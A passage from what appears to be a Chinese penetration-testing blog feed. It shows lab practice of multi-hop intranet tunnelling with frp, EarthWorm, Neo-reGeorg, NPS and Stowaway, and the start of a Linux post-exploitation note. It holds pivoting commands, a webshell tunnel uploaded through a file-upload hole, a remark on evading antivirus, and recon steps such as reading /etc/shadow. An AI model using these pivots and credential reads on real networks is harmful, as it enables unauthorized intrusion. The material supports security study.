routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows10<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>执行开启命令<br>frps.exe -c frpc.ini<br><br>web服务器<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=2345<br><span class="hljs-attribute">plugin</span>=socks5<br>执行开启命令<br>frpc.exe -c frpc.ini<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101810242.png" alt="image-20210805101810242"></p><p>测试连接成功了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101013784.png" alt="image-20210805101013784"></p><p>未搭建代理时，连接失败</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805102024585.png" alt="image-20210805102024585"></p><p>搭建代理后，连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805100948602.png" alt="image-20210805100948602"></p><h3 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114923729.png" alt="image-20210805114923729"></p><p>利用在win10（frps）和web服务器（frpc）搭建代理的基础上在Web服务器（frps）和内网主机1（frpc）上搭建代理，访问内网主机2</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>执行开启命令<br>frps.exe -c frpc.ini<br><br>Web服务器<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">local_ip</span>=10.10.3.18 # 不能写127.0.0.1 反正写了就会错误<br><span class="hljs-attribute">local_port</span>=6000 # web主机被内网主机连接的端口<br><span class="hljs-attribute">remote_port</span>=6000 # 映射到VPS的端口<br><br><span class="hljs-comment"># frps.ini</span><br>[common]<br><span class="hljs-attribute">bind_addr</span>=web-ip<br>bind_port = 7000<br><br>内网主机1<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 10.10.3.18 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=6000<br><span class="hljs-attribute">plugin</span>=socks5<br><br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114755986.png" alt="image-20210805114755986"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114714780.png" alt="image-20210805114714780"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114604466.png" alt="image-20210805114604466"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114411169.png" alt="image-20210805114411169"></p><blockquote><p>连接建立了，但是后面的代理服务器连接失败不知道具体是什么意思，但是以及可以连接内网主机了</p></blockquote><p>连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114320315.png" alt="image-20210805114320315"></p><p>三级代理就类似的来即可</p><h2 id="ew代理"><a href="#ew代理" class="headerlink" title="ew代理"></a>ew代理</h2><h3 id="一级代理-1"><a href="#一级代理-1" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130313193.png" alt="image-20210805130313193"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_win_32.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>Web服务器：ew_for_win_32.exe -s rssocks -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131042550.png" alt="image-20210805131042550"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130844477.png" alt="image-20210805130844477"></p><p>连接内网主机成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131203118.png" alt="image-20210805131203118"></p><h3 id="二级代理-1"><a href="#二级代理-1" class="headerlink" title="二级代理"></a>二级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805133050867.png" alt="image-20210805133050867"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_Win.exe -s lcx_listen -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>内网主机<span class="hljs-number">1</span>：ew_for_Win.exe -s ssocksd -l <span class="hljs-number">9000</span><br>Web服务器：ew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132433015.png" alt="image-20210805132433015"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132401981.png" alt="image-20210805132401981"></p><p>隧道搭建成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132209244.png" alt="image-20210805132209244"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132241110.png" alt="image-20210805132241110"></p><blockquote><p>连接时工具会突然停止运行，具体原因不清楚</p></blockquote><h3 id="三级代理"><a href="#三级代理" class="headerlink" title="三级代理"></a>三级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805135020239.png" alt="image-20210805135020239"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_Win.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>Web服务器：ew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br>内网主机<span class="hljs-number">1</span>：ew_for_Win.exe -s lcx_listen -l <span class="hljs-number">9000</span> -e <span class="hljs-number">7000</span><br>内网主机<span class="hljs-number">2</span>：ew_for_Win.exe -s rssocks -d <span class="hljs-number">10.10</span><span class="hljs-number">.21</span><span class="hljs-number">.128</span> -e <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><blockquote><p>隧道的级数越大所连接需要的时间就越长了</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140125688.png" alt="image-20210805140125688"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140156398.png" alt="image-20210805140156398"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140253519.png" alt="image-20210805140253519"></p><p>连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140008622.png" alt="image-20210805140008622"></p><blockquote><p>工具感觉还是容易被杀毒软件杀掉，还是需要自己去编写，或者自己做好免杀处理</p></blockquote><h2 id="Neo-reGeory"><a href="#Neo-reGeory" class="headerlink" title="Neo-reGeory"></a>Neo-reGeory</h2><blockquote><p>建立HTTP隧道的工具，适用于目标服务器只开放了80端口，通过80端口去探测内网服务器。（利用文件上传漏洞即可）</p></blockquote><p>下载：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>参考连接</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110389330">https://blog.csdn.net/qq_32393893/article/details/110389330</a></p><p>运行命令生成后面文件：<code>python neoreg.py generate -k lcdm123 </code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806093956906.png" alt="image-20210806093956906"></p><p>上传服务器支持的对应文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094624888.png" alt="image-20210806094624888"></p><blockquote><p>测试文件在线</p></blockquote><p>上传后本地搭建连接：<code>python neoreg.py -k lcdm123 -u http://web-ip/tunnel.php -p 6000</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094746686.png" alt="image-20210806094746686"></p><p>测试连接代理</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094918799.png" alt="image-20210806094918799"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806095050984.png" alt="image-20210806095050984"></p><p>成功了</p><h2 id="NPC-amp-NPS"><a href="#NPC-amp-NPS" class="headerlink" title="NPC&amp;NPS"></a>NPC&amp;NPS</h2><p><a href="https://aquilao.github.io/Blog/NPS/">https://aquilao.github.io/Blog/NPS/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907145149529.png" alt="image-20210907145149529"></p><p>这个的运行是身份简单的，由 NPS 生成一个 web 服务端，然后将 npc上传到靶机上按照 web 服务端给出的命令执行即可</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># NPS 配置  编辑 conf/nps.conf</span><br><span class="hljs-comment">#web</span><br>web_host=192.168.1.15  <span class="hljs-comment"># 服务器的ip</span><br>web_username=admin  <span class="hljs-comment"># 登录用户名</span><br>web_password=admin  <span class="hljs-comment"># 登录密码</span><br>web_port = 8080   <span class="hljs-comment"># web端口</span><br><br>将工具上传到了服务器后，如果是第一此执行则需要运行  sudo ./nps install<br>开启nps  nps start<br>./nps test|<span class="hljs-string">start</span>|<span class="hljs-string">stop</span>|<span class="hljs-string">restart</span>|<span class="hljs-string">status  测试配置文件</span>|<span class="hljs-string">启动</span>|<span class="hljs-string">停止</span>|<span class="hljs-string">重启</span>|<span class="hljs-string">状态</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907150908264.png" alt="image-20210907150908264"></p><blockquote><p>登录到 web 端，然后点击客户端，使用新增，之后就会有连接的命令，只需要把 npc 的传入靶机运行即可</p></blockquote><h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p><blockquote><p>比较新款的使用 go 编写的内网代理工具，星链计划推荐，应该会持续更新</p></blockquote><ul><li><code>admin</code> 渗透测试者使用的主控端</li><li><code>agent</code> 渗透测试者部署的被控端</li></ul><p><strong>Admin</strong></p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml">参数:<br>-<span class="ruby">l 被动模式下的监听地址[ip]<span class="hljs-symbol">:&lt;port&gt;</span></span><br><span class="ruby">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br><span class="ruby">-c 主动模式下的目标节点地址</span><br><span class="ruby">--proxy socks5代理服务器地址</span><br><span class="ruby">--proxyu socks5代理服务器用户名(可选)</span><br><span class="ruby">--proxyp socks5代理服务器密码(可选)</span><br><span class="ruby">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></code></pre></td></tr></table></figure><p><strong>Agent</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">参数:<br>-l 被动模式下的监听地址[ip]:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span></span><br>-s 节点通信加密密钥<br>-c 主动模式下的目标节点地址<br>--proxy socks5代理服务器地址<br>--proxyu socks5代理服务器用户名(可选)<br>--proxyp socks5代理服务器密码(可选)<br>--reconnect 重连时间间隔<br>--rehost 端口复用时复用的IP地址<br>--report 端口复用时复用的端口号<br>--up 上游协议类型,默认为裸TCP流量,可选HTTP<br>--down 下游协议类型,默认为裸TCP流量,可选HTTP<br></code></pre></td></tr></table></figure><blockquote><p>功能太多，使用步骤好复杂呀:cry:</p></blockquote><h3 id="一级代理-2"><a href="#一级代理-2" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917140954098.png" alt="image-20210917140954098"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">win10：windows_x86_admin.exe -l <span class="hljs-number">9000</span> -s password <br>web服务器: windows_x86_agent.exe -c <span class="hljs-number">192.168</span><span class="hljs-number">.44</span><span class="hljs-number">.1</span>:<span class="hljs-number">9000</span> -reconnect <span class="hljs-number">5</span><br># 这样两台电脑就建立了连接了<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143113458.png" alt="image-20210917143113458"></p><p>使用ssh 连接内网主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143151144.png" alt="image-20210917143151144"></p><p>开启 socks5 代理通道</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143228545.png" alt="image-20210917143228545"></p><blockquote><p>可以使用 stopsocks 停止</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917142735471.png" alt="image-20210917142735471"></p><blockquote><p>一级代理的搭建就是这么简单</p></blockquote><h3 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h3><blockquote><p>现在一级代理搭建好后，可以直接准备二级代理、</p></blockquote><p>使用 admin 在相应的节点建立监听</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152142891.png" alt="image-20210917152142891"></p><p>然后在内网主机执行连接操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152234610.png" alt="image-20210917152234610"></p><p>之后就会连接成功了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152258505.png" alt="image-20210917152258505"></p><blockquote><p>这里使用 connect 命令连接不上，具体原因暂时不清楚</p><p>操作步骤：内网靶机设置监听  -l  ；admin 执行 connect 操作连接主机响应端口</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152624930.png" alt="image-20210917152624930"></p><blockquote><p>工具基础操作其实也并不难，就是体积有点大，多级代理的操作就类似</p></blockquote><h3 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h3><ul><li><p>命令 agent 监听某个端口并等待子节点的接入：<code>listen</code></p><blockquote><ol><li><code>Normal passive</code>：agent 将会以普通的方式监听目标端口，并等待子节点接入</li><li><code>IPTables Reuse</code>：agetnt 将以 IPTable Reuse 的方式复用端口，并等待子节点接入</li><li><code>SOReuse</code>：agent 将会以 SOReuse 的方式复用端口，并等待子节点接入</li></ol><p><code>listen</code>  一次只能接受一个子节点，若需要多个子节点连入，需要多次执行</p></blockquote></li><li><p>使用 ssh 连接目标机器：<code>ssh ip:port</code></p></li><li><p>获取当前节点的 shll：<code>shell</code></p></li><li><p>在当前节点启动 socks5 服务：<code>socks port</code></p></li><li><p>停止 socks5 服务：<code>stopsocks</code></p></li><li><p>命令当前节点连接另一个子节点：<code>connect ip:port </code></p><blockquote><p>具体使用参照上面的多级代理</p></blockquote></li><li><p>命令当前节点以 ssh 隧道的方法连接另一个子节点：<code>sshtunnel ip:22 port</code></p><blockquote><p>具体使用和 connect 类似</p></blockquote></li><li><p>上传文件，选择好相应节点  <code>upload filename </code></p></li><li><p>下载文件，选择好相应节点 <code>download filename</code></p></li><li><p>返回到主 panel：<code>back</code></p></li><li><p>映射 admin 上的端口到远程端口：<code>forward 9000 127.0.0.1:22</code></p></li><li><p>关闭当前节点的远程映射：<code>stopforward</code></p></li><li><p>反向映射当前端 agent 端口到 admin 的本地端口： <code>backward 9001 22</code></p></li><li><p>关闭当前节点的反向映射：<code>stopbackward</code></p></li><li><p>命令当前节点下线：<code>shutdown</code></p></li></ul><h2 id="其他工具搭建隧道"><a href="#其他工具搭建隧道" class="headerlink" title="其他工具搭建隧道"></a>其他工具搭建隧道</h2><p><a href="https://v0w.top/2020/08/11/IntranetProxy/">https://v0w.top/2020/08/11/IntranetProxy/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网隧道搭建实践&quot;&gt;&lt;a href=&quot;#内网隧道搭建实践&quot; class=&quot;headerlink&quot; title=&quot;内网隧道搭建实践&quot;&gt;&lt;/a&gt;内网隧道搭建实践&lt;/h1&gt;&lt;h2 id=&quot;netsh隧道搭建&quot;&gt;&lt;a href=&quot;#netsh隧道搭建&quot; class=&quot;he</summary>
      
    
    
    
    <category term="内网" scheme="http://example.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透知识点</title>
    <link href="http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2021-10-13T10:55:50.000Z</published>
    <updated>2021-10-13T10:56:35.735Z</updated>
    
    <content type="html"><![CDATA[<h1 id="知识点梳理-amp-复现"><a href="#知识点梳理-amp-复现" class="headerlink" title="知识点梳理 &amp; 复现"></a>知识点梳理 &amp; 复现</h1><blockquote><p>要求：写清楚各个知识点，环境搭建，漏洞复现，使用的工具等</p></blockquote><h2 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ls</span> <span class="hljs-string">列举当前目录内容</span><br><span class="hljs-attr">ls</span> <span class="hljs-string">-al 查看当前目录下所有文件（包括隐藏文件），并且显示文件详细信息（修改时间，权限等）</span><br><br><span class="hljs-attr">find</span> <span class="hljs-string">查找文件（根据文件的属性进行查找）</span><br><span class="hljs-attr">find</span> <span class="hljs-string">/ -name demon.txt 在根目录下查找该文件</span><br><span class="hljs-attr">grep</span> <span class="hljs-string">查找文件（根据文件的内容进行查找），可以搭配正则表达式使用</span><br><span class="hljs-attr">which</span> <span class="hljs-string">在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个结果</span><br><br><span class="hljs-attr">cat</span> <span class="hljs-string">输出文件内容</span><br><span class="hljs-attr">cat</span> <span class="hljs-string">-n 显示内容的同时打印出行号</span><br><span class="hljs-attr">tac</span> <span class="hljs-string">与cat相反，从最后一行打印文件内容</span><br><span class="hljs-attr">nl</span> <span class="hljs-string">显示文件内容并且打印行号</span><br><span class="hljs-attr">head</span> <span class="hljs-string">查看文件前几行</span><br><span class="hljs-attr">head</span> <span class="hljs-string">-n number filename.txt 显示文件的先number行</span><br><span class="hljs-attr">tail</span> <span class="hljs-string">显示文件结尾几行（与head相反，用法相似）</span><br><span class="hljs-attr">more</span> <span class="hljs-string">对于比较长的文件内容会分页显示</span><br><span class="hljs-attr">less</span> <span class="hljs-string">自由上下翻页查看文件内容</span><br><br><span class="hljs-attr">touch</span> <span class="hljs-string">创建文件</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">删除文件</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">-f 强制删除文件</span><br><span class="hljs-attr">rm</span> <span class="hljs-string">-r 递归删除目录</span><br><span class="hljs-attr">mkdir</span> <span class="hljs-string">创建目录</span><br><span class="hljs-attr">rmdir</span> <span class="hljs-string">删除目录</span><br><br><span class="hljs-attr">cp</span> <span class="hljs-string">filename path/filename 复制文件</span><br><span class="hljs-attr">mv</span> <span class="hljs-string">filename path/filename 移动文件</span><br><br><span class="hljs-attr">pwd</span> <span class="hljs-string">显示当前位置</span><br><span class="hljs-attr">cd</span> <span class="hljs-string">切换文件路劲</span><br><br><span class="hljs-meta">vim/vi</span>  <span class="hljs-string">文件编辑</span><br><br><span class="hljs-meta">文件权限：r</span> <span class="hljs-string">可读 4   w 可写 2   x 可执行  1</span><br><span class="hljs-attr">rwx</span> = <span class="hljs-string">4+2+1 =7</span><br><span class="hljs-meta">drwxr-xr-x</span> <span class="hljs-string">1 kali kali  4096 Jul 19 15:36 1</span><br><span class="hljs-meta">-rw-r--r--</span> <span class="hljs-string">1 kali kali     0 Jul 19 15:36 2</span><br><span class="hljs-meta">第一位：d代表文件夹</span> <span class="hljs-string">-代表文件</span><br><span class="hljs-attr">第一段：代表拥有者的权限</span><br><span class="hljs-attr">第二段：拥有者所在组的组员权限</span><br><span class="hljs-attr">第三段：其他用户的权限</span><br><span class="hljs-meta">*</span> <span class="hljs-string">三位为一段</span><br><span class="hljs-attr">chmod</span> <span class="hljs-string">更改文件权限</span><br><span class="hljs-attr">chmod</span> <span class="hljs-string">777 file 设置文件所有人都可以读写</span><br><span class="hljs-attr">chown</span> <span class="hljs-string">修改文件拥有者权限（一般只有root用户有这个操作权限）</span><br><br><span class="hljs-attr">tar</span> <span class="hljs-string">打包并压缩文件</span><br><span class="hljs-attr">tar</span> <span class="hljs-string">-zcvf filename.tar demon.txt 压缩文件</span><br>    <span class="hljs-attr">tar</span> <span class="hljs-string">-zxvf filename.tar 解压文件</span><br></code></pre></td></tr></table></figure><h5 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h5><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">ps</span> <span class="hljs-string">显示系统运行进程</span><br><span class="hljs-attr">pstree</span> <span class="hljs-string">显示进程树</span><br><span class="hljs-attr">pstree</span> <span class="hljs-string">-aup 显示当前系统的进程树</span><br><span class="hljs-attr">top</span> <span class="hljs-string">默认按照cup的占用情况，显示进程</span><br><span class="hljs-attr">kill</span> <span class="hljs-string">终止进程 kill -l PID</span><br><span class="hljs-attr">killall</span> <span class="hljs-string">杀死同一进程组内的所有进程 killall taskname</span><br></code></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">重定向符 &gt;<br>管道符  <span class="hljs-string">|</span><br></code></pre></td></tr></table></figure><blockquote><p>目前只记得这些，后期再继续更新</p></blockquote><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">重要：<br>ipconfig 查看IP地址<br>netstat -ano 查看端口信息<br>whoami 当前用户（查询当前用户权限）<br>id 当前用户的权限和所在的管理组<br>uname -a 查看内核版本（方便后期利用内核漏洞提权）<br>ps/top 当前进程<br>cat <span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/cgroup 判断是否是docker容器<br>原理：容器是通过cgroup来实现资源限制，判断容器是否在一个cgroup组中<br>显示结果很长的就基本可以判断为docker<br><br>主要：<br><span class="hljs-regexp">/etc/</span>network/interfaces 查看网卡配置<br>cat <span class="hljs-regexp">/proc/</span>version 查看内核信息<br>cat <span class="hljs-regexp">/etc/</span>*release 查看linux发行信息<br>hostname 打印主机名<br>iptables -L 查看防火墙配置（需要root）<br>cat <span class="hljs-regexp">/etc/</span>apache2/apache2.conf apache配置文件<br>cat <span class="hljs-regexp">/etc/my</span>.conf  mysql配置文件<br>cat <span class="hljs-regexp">/etc/</span>shadow 查看账户密码信息（root权限）<br>cat <span class="hljs-regexp">/etc/</span>passwd 查看用户信息<br>cat <span class="hljs-regexp">/etc/g</span>roup 查看用户组信息<br>查看.bash_history文件 查看指令历史记录<br>查看.mysql_history文件 查看mysql操作记录<br>查看系统日志：<span class="hljs-regexp">/var/</span>log<br>查看登录日志：w  who lastlog<br><br>次要：<br>dpkg -l 查看安装的软件包<br>crontab -l 查看是否有计划任务<br>cat <span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-regexp">/init.d/</span>  开机启动项<br>cat <span class="hljs-regexp">/etc/</span>shells  查看可以用shell<br>env  打印系统环境信息<br>cat <span class="hljs-regexp">/proc/</span>cpuinfo  查看cpu信息<br>* /proc 目录很重要，需要注意<br></code></pre></td></tr></table></figure><blockquote><p>感觉Linux的内网渗透比较少见，收集的信息也相比于windows要少一些</p></blockquote><h4 id="提权手法"><a href="#提权手法" class="headerlink" title="提权手法"></a>提权手法</h4><h5 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h5><blockquote><p>提权原理偏向于Linux内核，没接触过这个方向，看来一下网上文章，不太能看懂。</p><p><a href="https://www.cnblogs.com/R4v3n/articles/9227723.html">https://www.cnblogs.com/R4v3n/articles/9227723.html</a></p></blockquote><p>先收集内核版本信息，然后直接利用工具提权（当个脚本小子挺好的），这几个工具利用起来感觉效果不好。</p><ol><li><code>searchsploit</code></li><li><a 